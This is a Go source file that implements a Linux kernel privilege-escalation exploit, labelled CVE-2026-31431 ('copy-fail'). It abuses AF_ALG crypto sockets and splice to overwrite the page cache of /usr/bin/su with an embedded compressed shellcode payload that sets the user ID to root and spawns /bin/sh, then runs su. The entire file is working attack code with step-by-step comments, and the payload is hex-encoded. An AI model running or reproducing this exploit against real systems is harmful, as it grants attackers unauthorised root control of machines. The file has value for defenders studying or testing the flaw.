//go:build linux
// +build linux

package main

import (
	"bytes"
	"compress/zlib"
	"encoding/hex"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"strings"
	"unsafe"

	"golang.org/x/sys/unix"
)

const (
	// Cryptographic API Socket Constants
	SOL_ALG               = 279
	ALG_SET_KEY           = 1
	ALG_SET_IV            = 2
	ALG_SET_OP            = 3
	ALG_SET_AEAD_ASSOCLEN = 4
	ALG_SET_AEAD_AUTHSIZE = 5
)

// packCmsg constructs a raw Control Message (CMSG) buffer to be sent alongside the payload
func packCmsg(level, typ int, data []byte) []byte {
	cmsgSpace := unix.CmsgSpace(len(data))
	b := make([]byte, cmsgSpace)
	h := (*unix.Cmsghdr)(unsafe.Pointer(&b[0]))
	h.Level = int32(level)
	h.Type = int32(typ)
	h.SetLen(unix.CmsgLen(len(data)))
	copy(b[unix.CmsgLen(0):], data)
	return b
}

// c is the core vulnerability trigger function, replacing 4 bytes of the target file's page cache
func c(f *os.File, t int, cData []byte) {
	// 1. Create AF_ALG cryptographic socket
	fd, err := unix.Socket(unix.AF_ALG, unix.SOCK_SEQPACKET, 0)
	if err != nil {
		log.Fatalf("Socket creation failed: %v", err)
	}
	defer unix.Close(fd)

	// 2. Bind it to the vulnerable Authenticated Encryption wrapper
	sa := &unix.SockaddrALG{
		Type: "aead",
		Name: "authencesn(hmac(sha256),cbc(aes))",
	}
	if err := unix.Bind(fd, sa); err != nil {
		log.Fatalf("Socket Bind failed: %v", err)
	}

	// 3. Setup dummy key and auth sizes
	keyHex := "0800010000000010" + strings.Repeat("0", 64)
	keyBytes, _ := hex.DecodeString(keyHex)

	if err := unix.SetsockoptString(fd, SOL_ALG, ALG_SET_KEY, string(keyBytes)); err != nil {
		log.Fatalf("Setsockopt(key) failed: %v", err)
	}
	if err := unix.SetsockoptInt(fd, SOL_ALG, ALG_SET_AEAD_AUTHSIZE, 4); err != nil {
		log.Fatalf("Setsockopt(authsize) failed: %v", err)
	}

	// 4. Accept a new operational socket connection.
	// AF_ALG requires accept(2) with NULL addr/addrlen; unix.Accept passes
	// non-NULL pointers and the kernel returns ECONNABORTED. See SockaddrALG
	// docs in golang.org/x/sys/unix.
	uFdRaw, _, errno := unix.Syscall6(unix.SYS_ACCEPT4, uintptr(fd), 0, 0, 0, 0, 0)
	if errno != 0 {
		log.Fatalf("Accept failed: %v", errno)
	}
	uFd := int(uFdRaw)
	defer unix.Close(uFd)

	// 5. Build Control Messages (CMSG)
	var oob []byte
	oob = append(oob, packCmsg(SOL_ALG, ALG_SET_OP, []byte{0, 0, 0, 0})...)                        // ALG_SET_OP (Decrypt)
	oob = append(oob, packCmsg(SOL_ALG, ALG_SET_IV, append([]byte{0x10}, make([]byte, 19)...))...) // ALG_SET_IV (20 bytes)
	oob = append(oob, packCmsg(SOL_ALG, ALG_SET_AEAD_ASSOCLEN, []byte{8, 0, 0, 0})...)             // ALG_SET_AEAD_ASSOCLEN

	// 6. Send payload payload out-of-band configuring encryption state
	msgData := append([]byte("AAAA"), cData...)
	err = unix.Sendmsg(uFd, msgData, oob, nil, unix.MSG_MORE)
	if err != nil {
		log.Fatalf("Sendmsg failed: %v", err)
	}

	// 7. Setup standard pipes for the splice
	var p [2]int
	if err := unix.Pipe(p[:]); err != nil {
		log.Fatalf("Pipe creation failed: %v", err)
	}
	defer unix.Close(p[0])
	defer unix.Close(p[1])

	// 8. Splice magic (Moves read-only page cache refs into the pipe -> then to the crypto socket)
	o := t + 4
	offset := int64(0)

	// Splice from the target file into the pipe
	_, err = unix.Splice(int(f.Fd()), &offset, p[1], nil, o, 0)
	if err != nil {
		log.Fatalf("Splice (File->Pipe) failed: %v", err)
	}

	// Splice from the pipe into the active crypto socket
	_, err = unix.Splice(p[0], nil, uFd, nil, o, 0)
	if err != nil {
		log.Fatalf("Splice (Pipe->Socket) failed: %v", err)
	}

	// 9. Consume response, triggering the memory-overwrite condition
	buf := make([]byte, 8+t)
	unix.Read(uFd, buf)
}

func decompressPayload(zlibBytes []byte) []byte {
	r, err := zlib.NewReader(bytes.NewReader(zlibBytes))
	if err != nil {
		log.Fatalf("Zlib decompression failed: %v", err)
	}
	payload, err := io.ReadAll(r)
	r.Close()
	if err != nil {
		log.Fatalf("Read zlib payload: %v", err)
	}
	return payload
}

func printHelp() {
	prog := os.Args[0]
	fmt.Fprintf(os.Stderr, "Usage: %s [-h|--help]\n\n", prog)
	fmt.Fprintf(os.Stderr, "Go implementation of CVE-2026-31431 (copy-fail).\n")
	fmt.Fprintf(os.Stderr, "Overwrites page cache of /usr/bin/su and runs su.\n")
	fmt.Fprintf(os.Stderr, "See https://copy.fail for for information.\n")
}

func main() {
	for _, arg := range os.Args[1:] {
		switch arg {
		case "-h", "--help", "-help":
			printHelp()
			os.Exit(0)
		}
	}

	var payload []byte

	// Original payload from https://github.com/theori-io/copy-fail-CVE-2026-31431
	// A 160 byte linux ELF binary that:
	// 1. Invokes the setuid(0) system call to set the user ID to root.
	// 2. Invokes the execve system call to execute /bin/sh.
	// 3. Exits cleanly if the execution fails.
	payloadHex := "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"
	payloadZlib, err := hex.DecodeString(payloadHex)
	if err != nil {
		log.Fatalf("Invalid hex payload: %v", err)
	}
	payload = decompressPayload(payloadZlib)

	// Open target file in read-only mode
	f, err := os.Open("/usr/bin/su")
	if err != nil {
		log.Fatalf("Failed to open target file: %v", err)
	}
	defer f.Close()

	// Iteratively overwrite the page cache of the file, 4 bytes at a time
	log.Printf("Overwriting page cache of %s with %d bytes", f.Name(), len(payload))
	for i := 0; i < len(payload); i += 4 {
		end := i + 4
		if end > len(payload) {
			end = len(payload)
		}
		c(f, i, payload[i:end])
		if len(payload) < 10000 {
			if i%100 == 0 {
				log.Printf("  ... wrote %d bytes", i+4)
			}
		} else {
			if i%10000 == 0 {
				log.Printf("  ... wrote %d bytes", i+4)
			}
		}
	}
	log.Printf("  ... wrote %d bytes", len(payload))

	// Execute the now-overwritten binary to trigger privilege escalation
	log.Println("Executing payload")
	var cmd *exec.Cmd
	cmd = exec.Command("su")
	cmd.Stdin = os.Stdin
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	if err := cmd.Run(); err != nil {
		log.Fatalf("Failed to execute payload: %v", err)
	}
}
